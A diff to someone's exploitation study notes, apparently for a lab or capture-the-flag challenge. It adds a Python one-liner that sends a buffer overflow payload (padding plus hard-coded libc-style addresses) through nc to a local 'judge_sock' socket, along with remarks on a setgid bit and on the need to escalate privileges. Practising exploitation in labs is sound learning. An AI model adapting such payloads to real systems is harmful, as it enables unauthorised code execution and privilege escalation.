@@ -531,6 +531,8 @@ What I am passing here is basically
 
 # Important difference -s string and -d decompile
 
+starting addres is libc
+
 ![[Pasted image 20260712203517.png]]
 
 
@@ -542,4 +544,19 @@ What I am passing here is basically
 
 ![[Pasted image 20260712204137.png]]
 
-# Finding 
+
+python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 256+ b"\x0a\xee\x66\xe2" + b"A" *8 + b"\x58\x3b\xdd\xff" + b"\x11\x65\xec\xf7")'| nc -U ~/judge_sock
+
+![[Pasted image 20260712213219.png]]
+
+# S bit is set to group !!!!
+
+![[Pasted image 20260712214022.png]]
+
+
+# Need to elevate privileges 
+
+![[Pasted image 20260712214517.png]]
+
+![[Pasted image 20260712214445.png]]
+
